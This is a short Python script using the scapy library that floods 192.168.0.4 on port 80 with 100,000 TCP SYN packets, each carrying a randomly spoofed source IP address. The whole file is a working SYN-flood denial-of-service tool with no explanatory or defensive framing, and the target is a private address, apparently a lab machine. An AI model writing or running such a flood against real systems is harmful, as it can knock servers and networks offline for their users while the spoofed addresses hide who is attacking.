from scapy.all import *
import random


for num_loop in range(10):
    for num_mass in range(10000):
        src  = f"{random.randint(1,200)}.{random.randint(1,200)}.{random.randint(1,200)}.{random.randint(1,200)}"
        ip=IP(src=src, dst="192.168.0.4")
        syn_packet = TCP(sport=1500, dport=80, flags="S", seq=100)
        send(ip/syn_packet)